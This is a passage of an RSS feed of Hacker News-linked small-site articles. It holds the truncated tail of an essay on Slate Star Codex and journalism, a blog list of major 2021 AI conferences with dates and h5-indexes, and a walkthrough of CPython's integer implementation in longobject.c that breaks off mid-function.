issues in exactly the way he wants to? Why can‚Äôt Facts Man bring up scientific facts relevant to other people‚Äôs humanity without getting called out for it? Why can‚Äôt Facts Man make obscenely offensive conjectures about life-or-death issues? Where‚Äôs the open debate? Why does Facts Man have to genuflect to other peoples‚Äô identity politics? Facts Man himself has no identity politics! He is an individual, as unique as a snowflake, but certainly not as fragile as one.</p></blockquote><p>Personally, I find myself somewhere between Lowrey and Alexander on this. The pure vision of the rationalists and the belief that statements could or should be read devoid of context or purely literally strikes me as untenable. But I think that in the Trump era, journalism as a whole has tilted too far in Lowrey‚Äôs direction, with too much room-reading and groupthink and ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.slowboring.com/p/slate-star-codex">https://www.slowboring.com/p/slate-star-codex</a></em></p>]]>
            </description>
            <link>https://www.slowboring.com/p/slate-star-codex</link>
            <guid isPermaLink="false">hacker-news-small-sites-26132104</guid>
            <pubDate>Sun, 14 Feb 2021 13:08:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The most important AI Conferences in 2021]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26131821">thread link</a>) | @amaigmbh
<br/>
February 14, 2021 | https://www.am.ai/en/blog/ai-conferences-2021/ | <a href="https://web.archive.org/web/*/https://www.am.ai/en/blog/ai-conferences-2021/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>February 2nd marks the start of a year filled with AI conferences. The 35th AAAI organized by the Association for the Advancement of Artificial Intelligence is the first of many important conferences this year. It can be quite challenging to keep an overview of the multitude of different AI Expert gatherings across the globe, ranging from small-scale meetups to international conferences with thousands of attendees. </p><p><span>
      <span></span>
  <img alt="2021 AI Conferences w Logos" title="2021 AI Conferences w Logos" src="https://www.am.ai/static/13c03f3b6095d9a414f705d3d3611763/fcda8/2021%20AI%20Conferences%20w%20Logos.png" srcset="https://www.am.ai/static/13c03f3b6095d9a414f705d3d3611763/12f09/2021%20AI%20Conferences%20w%20Logos.png 148w,https://www.am.ai/static/13c03f3b6095d9a414f705d3d3611763/e4a3f/2021%20AI%20Conferences%20w%20Logos.png 295w,https://www.am.ai/static/13c03f3b6095d9a414f705d3d3611763/fcda8/2021%20AI%20Conferences%20w%20Logos.png 590w,https://www.am.ai/static/13c03f3b6095d9a414f705d3d3611763/efc66/2021%20AI%20Conferences%20w%20Logos.png 885w,https://www.am.ai/static/13c03f3b6095d9a414f705d3d3611763/c83ae/2021%20AI%20Conferences%20w%20Logos.png 1180w,https://www.am.ai/static/13c03f3b6095d9a414f705d3d3611763/29114/2021%20AI%20Conferences%20w%20Logos.png 1920w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
    </span></p><p>Therefore, we have gathered the most important conferences below, based on scientific relevance. The relevance is indicated by the h5-index which <a target="_blank" rel="nofollow noopener noreferrer" href="https://scholar.google.com/citations?view_op=top_venues&amp;hl=en&amp;vq=eng_artificialintelligence">Google Scholar</a> computes for the publications of each conference, based on the authors <a target="_blank" rel="nofollow noopener noreferrer" href="https://en.wikipedia.org/wiki/H-index">H-indices</a>.</p><p>Below you will find introductions to the following segments:</p><ol><li>Top Computer Vision Conferences</li><li>Top General Machine Learning Conferences</li><li>Top AI Conferences on Specific Topics</li></ol><br><hr><br><p><span>
      <span></span>
  <img alt="logo cvpr" title="logo cvpr" src="https://www.am.ai/static/8855ce1a829025a43b2baa1ec08df4c9/fcda8/logo_cvpr.png" srcset="https://www.am.ai/static/8855ce1a829025a43b2baa1ec08df4c9/12f09/logo_cvpr.png 148w,https://www.am.ai/static/8855ce1a829025a43b2baa1ec08df4c9/e4a3f/logo_cvpr.png 295w,https://www.am.ai/static/8855ce1a829025a43b2baa1ec08df4c9/fcda8/logo_cvpr.png 590w,https://www.am.ai/static/8855ce1a829025a43b2baa1ec08df4c9/efc66/logo_cvpr.png 885w,https://www.am.ai/static/8855ce1a829025a43b2baa1ec08df4c9/c83ae/logo_cvpr.png 1180w,https://www.am.ai/static/8855ce1a829025a43b2baa1ec08df4c9/c1b63/logo_cvpr.png 1200w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
    </span></p><h3>IEEE/CVF Conference on Computer Vision and Pattern Recognition <strong>(CVPR)</strong></h3><p><strong>19.-25. June 2021 <!-- -->&nbsp;<!-- --> Location: Virtual <!-- -->&nbsp;<!-- --> h5-index: 299 <!-- -->&nbsp;<!-- --> Website: <a target="_blank" rel="nofollow noopener noreferrer" href="http://cvpr2021.thecvf.com/">cvpr2021.thecvf.com</a> <!-- -->&nbsp;<!-- --> Focus: Computer Vision</strong></p><blockquote><p>The Conference on Computer Vision and Pattern Recognition (CVPR) is an annual conference on computer vision and pattern recognition, which is regarded as one of the most important conferences in its field.</p></blockquote><p><span>
      <span></span>
  <img alt="logo iccv" title="logo iccv" src="https://www.am.ai/static/a3fd3a3729f70714b490de4d7344df16/fcda8/logo_iccv.png" srcset="https://www.am.ai/static/a3fd3a3729f70714b490de4d7344df16/12f09/logo_iccv.png 148w,https://www.am.ai/static/a3fd3a3729f70714b490de4d7344df16/e4a3f/logo_iccv.png 295w,https://www.am.ai/static/a3fd3a3729f70714b490de4d7344df16/fcda8/logo_iccv.png 590w,https://www.am.ai/static/a3fd3a3729f70714b490de4d7344df16/efc66/logo_iccv.png 885w,https://www.am.ai/static/a3fd3a3729f70714b490de4d7344df16/c83ae/logo_iccv.png 1180w,https://www.am.ai/static/a3fd3a3729f70714b490de4d7344df16/c1b63/logo_iccv.png 1200w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
    </span></p><h3>IEEE/CVF International Conference on Computer Vision <strong>(ICCV)</strong></h3><p><strong>11.-17. October 2021 <!-- -->&nbsp;<!-- --> Location: Montreal, Canada <!-- -->&nbsp;<!-- --> h5-index: 176 <!-- -->&nbsp;<!-- --> Website: <a target="_blank" rel="nofollow noopener noreferrer" href="http://iccv2021.thecvf.com/home">iccv2021.thecvf.com/home</a> <!-- -->&nbsp;<!-- --> Focus: Computer Vision</strong></p><blockquote><p>The International Conference on Computer Vision (ICCV) is a research conference sponsored by the Institute of Electrical and Electronics Engineers (IEEE) held every other year. It is considered to be one of the top conferences in computer vision, alongside CVPR and ECCV, and it is held on years in which ECCV is not.</p></blockquote><br><hr><br><p><span>
      <span></span>
  <img alt="logo iclr" title="logo iclr" src="https://www.am.ai/static/dc0b3a1d326fb05be6b2fb7c8ef36d94/fcda8/logo_iclr.png" srcset="https://www.am.ai/static/dc0b3a1d326fb05be6b2fb7c8ef36d94/12f09/logo_iclr.png 148w,https://www.am.ai/static/dc0b3a1d326fb05be6b2fb7c8ef36d94/e4a3f/logo_iclr.png 295w,https://www.am.ai/static/dc0b3a1d326fb05be6b2fb7c8ef36d94/fcda8/logo_iclr.png 590w,https://www.am.ai/static/dc0b3a1d326fb05be6b2fb7c8ef36d94/efc66/logo_iclr.png 885w,https://www.am.ai/static/dc0b3a1d326fb05be6b2fb7c8ef36d94/c83ae/logo_iclr.png 1180w,https://www.am.ai/static/dc0b3a1d326fb05be6b2fb7c8ef36d94/c1b63/logo_iclr.png 1200w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
    </span></p><h3>International Conference on Learning Representations <strong>(ICLR)</strong></h3><p><strong>5.-8. May 2021 <!-- -->&nbsp;<!-- --> Location: Virtual <!-- -->&nbsp;<!-- --> h5-index: 203 <!-- -->&nbsp;<!-- --> Website: <a target="_blank" rel="nofollow noopener noreferrer" href="https://iclr.cc/">iclr.cc</a> <!-- -->&nbsp;<!-- --> Focus: Deep Learning</strong></p><blockquote><p>ICLR is one of the fastest growing artificial intelligence conferences in the world.
The International Conference on Learning Representations (ICLR) is the premier gathering of professionals dedicated to the advancement of the branch of artificial intelligence called representation learning, but generally referred to as deep learning.</p><p>ICLR is globally renowned for presenting and publishing cutting-edge research on all aspects of deep learning used in the fields of artificial intelligence, statistics and data science, as well as important application areas such as machine vision, computational biology, speech recognition, text understanding, gaming, and robotics.</p><p>The conference is presided by "Godfathers of AI" Yann LeCun and Yoshua Bengio.</p></blockquote><p><span>
      <span></span>
  <img alt="logo neurips" title="logo neurips" src="https://www.am.ai/static/bcd6c35e10b406be392880d597dc2ee8/fcda8/logo_neurips.png" srcset="https://www.am.ai/static/bcd6c35e10b406be392880d597dc2ee8/12f09/logo_neurips.png 148w,https://www.am.ai/static/bcd6c35e10b406be392880d597dc2ee8/e4a3f/logo_neurips.png 295w,https://www.am.ai/static/bcd6c35e10b406be392880d597dc2ee8/fcda8/logo_neurips.png 590w,https://www.am.ai/static/bcd6c35e10b406be392880d597dc2ee8/efc66/logo_neurips.png 885w,https://www.am.ai/static/bcd6c35e10b406be392880d597dc2ee8/c83ae/logo_neurips.png 1180w,https://www.am.ai/static/bcd6c35e10b406be392880d597dc2ee8/c1b63/logo_neurips.png 1200w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
    </span></p><h3>Neural Information Processing Systems <strong>(NeurIPS)</strong></h3><p><strong>27. November - 5. December 2021 <!-- -->&nbsp;<!-- --> Location: TBA <!-- -->&nbsp;<!-- --> h5-index: 198 <!-- -->&nbsp;<!-- --> Website: <a target="_blank" rel="nofollow noopener noreferrer" href="https://nips.cc/">nips.cc</a></strong></p><blockquote><p>The Conference and Workshop on Neural Information Processing Systems (abbreviated as NeurIPS and formerly NIPS) is a machine learning and computational neuroscience conference held every December. The conference is currently a double-track meeting (single-track until 2015) that includes invited talks as well as oral and poster presentations of refereed papers, followed by parallel-track workshops.</p><p>Landmark publications in the past include object detector Faster R-CNN and the Attention Is All You Need paper that introduced the Transformer architecture.</p></blockquote><p><span>
      <span></span>
  <img alt="logo icml" title="logo icml" src="https://www.am.ai/static/caeb54cb7ba4bcb78cf209724f43cb3d/fcda8/logo_icml.png" srcset="https://www.am.ai/static/caeb54cb7ba4bcb78cf209724f43cb3d/12f09/logo_icml.png 148w,https://www.am.ai/static/caeb54cb7ba4bcb78cf209724f43cb3d/e4a3f/logo_icml.png 295w,https://www.am.ai/static/caeb54cb7ba4bcb78cf209724f43cb3d/fcda8/logo_icml.png 590w,https://www.am.ai/static/caeb54cb7ba4bcb78cf209724f43cb3d/efc66/logo_icml.png 885w,https://www.am.ai/static/caeb54cb7ba4bcb78cf209724f43cb3d/c83ae/logo_icml.png 1180w,https://www.am.ai/static/caeb54cb7ba4bcb78cf209724f43cb3d/c1b63/logo_icml.png 1200w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
    </span></p><h3>International Conference on Machine Learning <strong>(ICML)</strong></h3><p><strong>18.-24. July 2021 <!-- -->&nbsp;<!-- --> Location: Virtual <!-- -->&nbsp;<!-- --> h5-index: 171 <!-- -->&nbsp;<!-- --> Website: <a target="_blank" rel="nofollow noopener noreferrer" href="https://icml.cc/">icml.cc</a></strong></p><blockquote><p>The International Conference on Machine Learning (ICML) is the premier gathering of professionals dedicated to the advancement of the branch of artificial intelligence known as machine learning.</p><p>ICML is globally renowned for presenting and publishing cutting-edge research on all aspects of machine learning used in closely related areas like artificial intelligence, statistics and data science, as well as important application areas such as machine vision, computational biology, speech recognition, and robotics.</p><p>ICML is one of the fastest growing artificial intelligence conferences in the world. Participants at ICML span a wide range of backgrounds, from academic and industrial researchers, to entrepreneurs and engineers, to graduate students and postdocs.</p></blockquote><p><span>
      <span></span>
  <img alt="logo aaai" title="logo aaai" src="https://www.am.ai/static/41434e10a70caa564a4d420ef394e493/fcda8/logo_aaai.png" srcset="https://www.am.ai/static/41434e10a70caa564a4d420ef394e493/12f09/logo_aaai.png 148w,https://www.am.ai/static/41434e10a70caa564a4d420ef394e493/e4a3f/logo_aaai.png 295w,https://www.am.ai/static/41434e10a70caa564a4d420ef394e493/fcda8/logo_aaai.png 590w,https://www.am.ai/static/41434e10a70caa564a4d420ef394e493/efc66/logo_aaai.png 885w,https://www.am.ai/static/41434e10a70caa564a4d420ef394e493/c83ae/logo_aaai.png 1180w,https://www.am.ai/static/41434e10a70caa564a4d420ef394e493/c1b63/logo_aaai.png 1200w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
    </span></p><h3>AAAI Conference on Artificial Intelligence <strong>(AAAI)</strong></h3><p><strong>2.-9. February 2021 <!-- -->&nbsp;<!-- --> Location: Virtual <!-- -->&nbsp;<!-- --> h5-index: 126 <!-- -->&nbsp;<!-- --> Website: <a target="_blank" rel="nofollow noopener noreferrer" href="https://aaai.org/">aaai.org</a></strong></p><blockquote><p>The 35th AAAI Conference on Artificial Intelligence (AAAI-21) will have a diverse technical track, student abstracts, poster sessions, invited speakers, tutorials, workshops, and exhibit and competition programs, all selected according to the highest reviewing standards. AAAI-21 welcomes submissions on mainstream AI topics as well as novel crosscutting work in related areas.</p><p>Among the highlights this year is the Liquid Time-Constant Networks paper by Hasani et al. (<a target="_blank" rel="nofollow noopener noreferrer" href="https://news.mit.edu/2021/machine-learning-adapts-0128">news.mit.edu</a>).</p></blockquote><br><hr><br><p><span>
      <span></span>
  <img alt="logo chi" title="logo chi" src="https://www.am.ai/static/976284121888ce61ade73b91e387a765/fcda8/logo_chi.png" srcset="https://www.am.ai/static/976284121888ce61ade73b91e387a765/12f09/logo_chi.png 148w,https://www.am.ai/static/976284121888ce61ade73b91e387a765/e4a3f/logo_chi.png 295w,https://www.am.ai/static/976284121888ce61ade73b91e387a765/fcda8/logo_chi.png 590w,https://www.am.ai/static/976284121888ce61ade73b91e387a765/efc66/logo_chi.png 885w,https://www.am.ai/static/976284121888ce61ade73b91e387a765/c83ae/logo_chi.png 1180w,https://www.am.ai/static/976284121888ce61ade73b91e387a765/c1b63/logo_chi.png 1200w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
    </span></p><h3>ACM Conference on Human Factors in Computing Systems <strong>(CHI)</strong></h3><p><strong>8.-13. May 2021 <!-- -->&nbsp;<!-- --> Location: Virtual <!-- -->&nbsp;<!-- --> h5-index: 95 <!-- -->&nbsp;<!-- --> Website: <a target="_blank" rel="nofollow noopener noreferrer" href="https://chi2021.acm.org/">chi2021.acm.org</a> <!-- -->&nbsp;<!-- --> Focus: Human Computer Interaction (HCI)</strong></p><blockquote><p>The 2021 ACM CHI Virtual Conference on Human Factors in Computing Systems is the premier international conference on Human-Computer Interaction. CHI ‚Äì pronounced ‚Äòkai‚Äô ‚Äì is a place where researchers and practitioners gather from across the world to discuss the latest in interactive technology. CHI is generally considered the most prestigious in the field of HCI and attracts thousands of international attendees annually.</p></blockquote><p><span>
      <span></span>
  <img alt="logo acl" title="logo acl" src="https://www.am.ai/static/e3f12ea2d3f7744c933e2d193eb4c91a/fcda8/logo_acl.png" srcset="https://www.am.ai/static/e3f12ea2d3f7744c933e2d193eb4c91a/12f09/logo_acl.png 148w,https://www.am.ai/static/e3f12ea2d3f7744c933e2d193eb4c91a/e4a3f/logo_acl.png 295w,https://www.am.ai/static/e3f12ea2d3f7744c933e2d193eb4c91a/fcda8/logo_acl.png 590w,https://www.am.ai/static/e3f12ea2d3f7744c933e2d193eb4c91a/efc66/logo_acl.png 885w,https://www.am.ai/static/e3f12ea2d3f7744c933e2d193eb4c91a/c83ae/logo_acl.png 1180w,https://www.am.ai/static/e3f12ea2d3f7744c933e2d193eb4c91a/c1b63/logo_acl.png 1200w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
    </span></p><h3>Meeting of the Association for Computational Linguistics <strong>(ACL)</strong></h3><p><strong>1.-6. August 2021 <!-- -->&nbsp;<!-- --> Location: Bangkok, Thailand <!-- -->&nbsp;<!-- --> h5-index: 135 <!-- -->&nbsp;<!-- --> Website: <a target="_blank" rel="nofollow noopener noreferrer" href="https://2021.aclweb.org/">2021.aclweb.org</a> <!-- -->&nbsp;<!-- --> Focus: Language Processing</strong></p><blockquote><p>ACL is the premier conference of the field of computational linguistics, covering a broad spectrum of diverse research areas that are concerned with computational approaches to natural language. It will be held jointly with the 11th International Joint Conference on Natural Language Processing of the Asian Federation of Natural Language Processing (AFNLP). </p></blockquote><p><span>
      <span></span>
  <img alt="logo kdd" title="logo kdd" src="https://www.am.ai/static/2d84a416fa15e4c8fa02a030539e3fdc/fcda8/logo_kdd.png" srcset="https://www.am.ai/static/2d84a416fa15e4c8fa02a030539e3fdc/12f09/logo_kdd.png 148w,https://www.am.ai/static/2d84a416fa15e4c8fa02a030539e3fdc/e4a3f/logo_kdd.png 295w,https://www.am.ai/static/2d84a416fa15e4c8fa02a030539e3fdc/fcda8/logo_kdd.png 590w,https://www.am.ai/static/2d84a416fa15e4c8fa02a030539e3fdc/efc66/logo_kdd.png 885w,https://www.am.ai/static/2d84a416fa15e4c8fa02a030539e3fdc/c83ae/logo_kdd.png 1180w,https://www.am.ai/static/2d84a416fa15e4c8fa02a030539e3fdc/c1b63/logo_kdd.png 1200w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
    </span></p><h3>ACM International Conference on Knowledge Discovery and Data Mining <strong>(KDD)</strong></h3><p><strong>14.-18. August 2021 <!-- -->&nbsp;<!-- --> Location: Singapore <!-- -->&nbsp;<!-- --> h5-index: 90 <!-- -->&nbsp;<!-- --> Website: <a target="_blank" rel="nofollow noopener noreferrer" href="https://www.kdd.org/kdd2021/">kdd.org/kdd2021</a> <!-- -->&nbsp;<!-- --> Focus: Data Mining</strong></p><blockquote><p>The Special Interest Group for Knowledge Discovery and Data Mining of the Association for Computing Machinery hosts the annual premier forum for data mining researchers and practitioners from academia, industry, and government to share ideas, research results and experiences. </p></blockquote><hr><br><h3>AI Conferences 2021 sorted by Relevance</h3><br><h3>AI Conferences 2021 sorted by Date</h3><hr><p><span>
      <span></span>
  <img alt="logo amai" title="logo amai" src="https://www.am.ai/static/999f1bdfb6154e361027ac558cd7bad1/fcda8/logo_amai.png" srcset="https://www.am.ai/static/999f1bdfb6154e361027ac558cd7bad1/12f09/logo_amai.png 148w,https://www.am.ai/static/999f1bdfb6154e361027ac558cd7bad1/e4a3f/logo_amai.png 295w,https://www.am.ai/static/999f1bdfb6154e361027ac558cd7bad1/fcda8/logo_amai.png 590w,https://www.am.ai/static/999f1bdfb6154e361027ac558cd7bad1/efc66/logo_amai.png 885w,https://www.am.ai/static/999f1bdfb6154e361027ac558cd7bad1/c83ae/logo_amai.png 1180w,https://www.am.ai/static/999f1bdfb6154e361027ac558cd7bad1/c1b63/logo_amai.png 1200w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
    </span></p><p>We certainly have an exciting year ahead of us. New scientific breakthroughs will be announced at the expert meetings listed above. But sifting through conference proceedings naturally requires a lot of time and expertise. Instead of digging through countless pages, you can stay up to date with our <strong><a target="_blank" rel="nofollow noopener noreferrer" href="https://i.am.ai/newsletter">i.am.ai AI Newsletter</a></strong>.</p><p>To talk to an AI Expert about the latest technologies and <strong>practical applications</strong> for your business, say <strong><a target="_blank" rel="nofollow noopener noreferrer" href="mailto:hi@am.ai">hi@am.ai</a></strong>.</p></div></div>]]>
            </description>
            <link>https://www.am.ai/en/blog/ai-conferences-2021/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26131821</guid>
            <pubDate>Sun, 14 Feb 2021 12:29:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Python Internals Serie: Int (Long) Object]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26131703">thread link</a>) | @karroum
<br/>
February 14, 2021 | http://ykarroum.com/2021/01/10/intobject/ | <a href="https://web.archive.org/web/*/http://ykarroum.com/2021/01/10/intobject/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <div>
  
  <p><span>10 Jan 2021</span></p><p>In this article, we will read and discuss the implementation details of <em>ints</em> in <em>CPython</em>.</p>

<p>Altough using integers in python is fairly easy :</p>

<figure><pre><code data-lang="python"><span>a</span> <span>=</span> <span>1</span>

<span>b</span> <span>=</span> <span>a</span> <span>+</span> <span>5</span></code></pre></figure>

<p>The implementation file contains more than 5000 code lines.</p>

<p>Since the file contains roughly 116 functions/macros, I‚Äôll probably skip some (most of ?) functions.</p>

<p>Without further ado, let‚Äôs dive into the code !</p>

<h3 id="longobjectc">longobject.c</h3>

<p>First we need to find a starting point, we know that all pythons objects are stored in <code>cpython/Objects</code>.</p>

<p>Unfortunetly, we don‚Äôt seem to have an <code>intobject.c</code> file. That‚Äôs because the underlying C object for python integers is <code>PyLongObject</code>.</p>

<p>The file we‚Äôre interessted in is : <code>longobject.c</code></p>

<p>From now one I will refer to python‚Äôs integers implementation both using <em>integers</em> or <em>longs</em>, which is not technically accurate since in <em>C</em> those are different types.</p>

<p>For the rest of this article, we‚Äôll revisit some of the most used operations/functions related to integers.</p>

<h4 id="medium_valuex">MEDIUM_VALUE(x)</h4>

<figure><pre><code data-lang="c"><span>/* convert a PyLong of size 1, 0 or -1 to an sdigit */</span>
<span>#define MEDIUM_VALUE(x) (assert(-1 &lt;= Py_SIZE(x) &amp;&amp; Py_SIZE(x) &lt;= 1),   \
         Py_SIZE(x) &lt; 0 ? -(sdigit)(x)-&gt;ob_digit[0] :   \
             (Py_SIZE(x) == 0 ? (sdigit)0 :                             \
              (sdigit)(x)-&gt;ob_digit[0]))</span></code></pre></figure>

<p>The comment is pretty explanatory, the macro convert a given <em>long</em> to an <em>sdigit</em>. But what‚Äôs an sdigit ? Well it depends :</p>

<figure><pre><code data-lang="c"><span>#if PYLONG_BITS_IN_DIGIT == 30 </span><span>/* signed variant of digit */</span><span>
</span><span>typedef</span> <span>int32_t</span> <span>sdigit</span>
<span>#elif PYLONG_BITS_IN_DIGIT == 15
</span><span>typedef</span> <span>short</span> <span>sdigit</span><span>;</span> <span>/* signed variant of digit */</span>
<span>#else
#error "PYLONG_BITS_IN_DIGIT should be 15 or 30
#endif</span></code></pre></figure>

<p>The <code>PYLONG_BITS_IN_DIGIT</code> is defined either at configure time or in <code>pyport.h</code>.</p>

<p>We have an assert to protect us from accidently casting a big integer, which is not small enough to fit in an sdigit, to an sdigit, which may result in a loss of information, therefore potentiely issues which can be hard to detect.</p>

<p>Curiously, the assert check that the <em>size</em> of x is bigger than -1, but can be less than 0 ? My guess is that size is unsigned to represent both the size and the sign of the integer, for exemple : <code>PY_SIZE(-15) = -2</code>.
This seems to be confirmed with <code>Py_SIZE(x) &lt; 0 ? -(sdigit)(x)-&gt;ob_digit[0]</code>.</p>

<p><code>ob_digit</code> looks like an array containing our integer. which can be confirmed in the file <code>longintrepr.h</code> :</p>

<figure><pre><code data-lang="c"><span>struct</span> <span>_longobject</span> <span>{</span>
    <span>PyObject_VAR_HEAD</span>
    <span>digit</span> <span>ob_digit</span><span>[</span><span>1</span><span>];</span>
<span>};</span></code></pre></figure>

<p>One curious fact, that I can‚Äôt explain, is the small size of the array (one element ?), maybe it‚Äôs somehow changed at runtime.</p>

<h4 id="is_small_intival">IS_SMALL_INT(ival)</h4>

<figure><pre><code data-lang="c"><span>#define IS_SMALL_INT(ival) (-NSMALLNEGINTS &lt;= (ival) &amp;&amp; (ival) &lt; NSMALLPOSINTS)</span></code></pre></figure>

<p>Pretty straightforward function.</p>

<p><code>NSMALLPOSINTS</code> and <code>NSMALLNEGINTS</code> is defined in the <code>pycore_interp.h</code> file :</p>

<figure><pre><code data-lang="c"><span>/* interpreter state */</span>

<span>#define _PY_NSMALLPOSINTS           257
#define _PY_NSMALLNEGINTS           5</span></code></pre></figure>

<p>To undesrtand why those 2 magic numbers and where this macro is used, let‚Äôs dive into the next function.</p>

<h4 id="static-pyobject--get_small_intsdigit-ival">static PyObject * get_small_int(sdigit ival)</h4>

<figure><pre><code data-lang="c"><span>static</span> <span>PyObject</span> <span>*</span>
<span>get_small_int</span><span>(</span><span>sdigit</span> <span>ival</span><span>)</span>
<span>{</span>
    <span>assert</span><span>(</span><span>IS_SMALL_INT</span><span>(</span><span>ival</span><span>));</span>
    <span>PyInterpreterState</span> <span>*</span><span>interp</span> <span>=</span> <span>_PyInterpreterState_GET</span><span>();</span>
    <span>PyObject</span> <span>*</span><span>v</span> <span>=</span> <span>(</span><span>PyObject</span><span>*</span><span>)</span><span>interp</span><span>-&gt;</span><span>small_ints</span><span>[</span><span>ival</span> <span>+</span> <span>NSMALLNEGINTS</span><span>];</span>
    <span>Py_INCREF</span><span>(</span><span>v</span><span>);</span>
    <span>return</span> <span>v</span><span>;</span>
<span>}</span></code></pre></figure>

<p>This function implements what is commonly known as the <em>Flyweight pattern</em>, as explained here : <a href="https://python-patterns.guide/gang-of-four/flyweight/">https://python-patterns.guide/gang-of-four/flyweight/</a>, the flyweight pattern is used in python to create at the initialisation phase all the integers in the range [-5, 256]. At the runtime, whenever you ask for a number in this range, you‚Äôll always get the <em>same</em> number.</p>

<p>Which can be easily checked :</p>

<figure><pre><code data-lang="python"><span>20</span> <span>+</span> <span>30</span> <span>is</span> <span>50</span> <span># True
</span><span>200</span> <span>+</span> <span>300</span> <span>is</span> <span>500</span> <span># False</span></code></pre></figure>

<p>Those integers objects are stored in the interpreter state.</p>

<p>According to <a href="https://tenthousandmeters.com/blog/python-behind-the-scenes-1-how-the-cpython-vm-works/">https://tenthousandmeters.com/blog/python-behind-the-scenes-1-how-the-cpython-vm-works/</a> :</p>

<blockquote>
  <p>An interpreter state is a group of threads along with the data specific to this group. Threads share such things as loaded modules (sys.modules), builtins (builtins.<strong>dict</strong>) and the import system (importlib).</p>
</blockquote>

<p>Apparently flyweight integers are stored there.</p>

<p>We also use <code>Py_INCREF</code> to increment the reference count of the returned integer, recall that reference counting is what is used by the CPython garbage collector to detect which objects to free (Well not just that, since reference counting alone doesn‚Äôt resolve circular references, but we‚Äôll discuss the <em>gc</em> in more details in future articles).</p>

<h4 id="maybe_small_long">maybe_small_long</h4>

<p>Straitforward function, we check a given integer is small enough to fit into an sdigit, if it‚Äôs the case we downcast it to an sdigit using the <code>MEDIUM_VALUE</code>. After downcasting we check if the integer is in the flyweight range <em>[-5, 257]</em>, if it‚Äôs the case we decrement the referece counting (since we don‚Äôt need two PyLong objects) and we return a reference on the already allocated number.</p>

<h3 id="how-are-longs-created">How are longs created</h3>

<p>Longs are created using the function <code>PyLongObject * _PyLong_New(Py_ssize_t size)</code>, size here refer to the number of digit of the target long.</p>

<figure><pre><code data-lang="c"><span>if</span> <span>(</span><span>size</span> <span>&gt;</span> <span>(</span><span>Py_ssize_t</span><span>)</span><span>MAX_LONG_DIGITS</span><span>)</span> <span>{</span>
	<span>PyErr_SetString</span><span>(</span><span>PyExc_OverflowError</span><span>,</span>
					<span>"too many digits in integer"</span><span>);</span>
	<span>return</span> <span>NULL</span><span>;</span>
<span>}</span></code></pre></figure>

<p>Well, looks like we can‚Äôt have an indefinely big integer, but how big can our integers be ?</p>

<figure><pre><code data-lang="c"><span>#define MAX_LONG_DIGITS \
    ((PY_SSIZE_T_MAX - offsetof(PyLongObject, ob_digit))/sizeof(digit))</span></code></pre></figure>

<p>If you don‚Äôt already know it, <em>offsetof</em> is a <em>C</em> function wich will basicaly return an offset of the member (ob_digit) from the structure (PyLongObject), if you recall correctly, since our struture only contains <code>PyObject_VAR_HEAD</code> and 	<code>digit ob_digit</code>. so the offset is the memorry taken with VAR_HEAD.</p>

<p>So a integer has a maximal size of roughly Py_SSIZE_T_MAx.</p>

<p>According to this answer : <a href="https://stackoverflow.com/a/42777910/14517936">https://stackoverflow.com/a/42777910/14517936</a> <code>Py_SSIZE_T_MAX = sys.maxsize</code>, which is according to the official documentation ( <a href="https://docs.python.org/3/library/sys.html#sys.maxsize">https://docs.python.org/3/library/sys.html#sys.maxsize</a> ) equal to <code>2**31 - 1</code> on 32 bits machine or <code>2**63 - 1</code>.</p>

<p><code>2**63 - 1</code> is a huge number of digits.</p>

<p>You can check this limit yourself by doing :</p>

<figure><pre><code data-lang="python"><span>import</span> <span>sys</span>
<span>10</span><span>**</span><span>sys</span><span>.</span><span>maxsize</span></code></pre></figure>

<p>If the size is fine, we allocate enough memory to store our integer :</p>

<figure><pre><code data-lang="c"><span>result</span> <span>=</span> <span>PyObject_MALLOC</span><span>(</span><span>offsetof</span><span>(</span><span>PyLongObject</span><span>,</span> <span>ob_digit</span><span>)</span> <span>+</span>
						 <span>size</span><span>*</span><span>sizeof</span><span>(</span><span>digit</span><span>));</span>
<span>if</span> <span>(</span><span>!</span><span>result</span><span>)</span> <span>{</span>
	<span>PyErr_NoMemory</span><span>();</span>
	<span>return</span> <span>NULL</span><span>;</span>
<span>}</span></code></pre></figure>

<p>As a good practice you should ALWAYS check that an allocation had correctly been performed, which may not be the case if you don‚Äôt have enough memory for example, your futur self will thank you.</p>

<h3 id="adding-two-integers">Adding two integers</h3>

<figure><pre><code data-lang="c"><span>static</span> <span>PyObject</span> <span>*</span>
<span>long_add</span><span>(</span><span>PyLongObject</span> <span>*</span><span>a</span><span>,</span> <span>PyLongObject</span> <span>*</span><span>b</span><span>)</span>
<span>{</span>
    <span>PyLongObject</span> <span>*</span><span>z</span><span>;</span>

    <span>CHECK_BINOP</span><span>(</span><span>a</span><span>,</span> <span>b</span><span>);</span>

    <span>if</span> <span>(</span><span>Py_ABS</span><span>(</span><span>Py_SIZE</span><span>(</span><span>a</span><span>))</span> <span>&lt;=</span> <span>1</span> <span>&amp;&amp;</span> <span>Py_ABS</span><span>(</span><span>Py_SIZE</span><span>(</span><span>b</span><span>))</span> <span>&lt;=</span> <span>1</span><span>)</span> <span>{</span>
        <span>return</span> <span>PyLong_FromLong</span><span>(</span><span>MEDIUM_VALUE</span><span>(</span><span>a</span><span>)</span> <span>+</span> <span>MEDIUM_VALUE</span><span>(</span><span>b</span><span>));</span>
    <span>}</span>
